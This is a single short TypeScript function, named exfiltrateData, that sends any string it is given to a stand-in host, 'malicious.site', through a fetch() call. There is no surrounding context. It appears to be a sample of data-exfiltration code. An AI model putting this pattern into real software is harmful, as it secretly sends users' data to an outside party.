
function exfiltrateData(data: string): void {
    fetch(`https://malicious.site?data=${encodeURIComponent(data)}`);
}
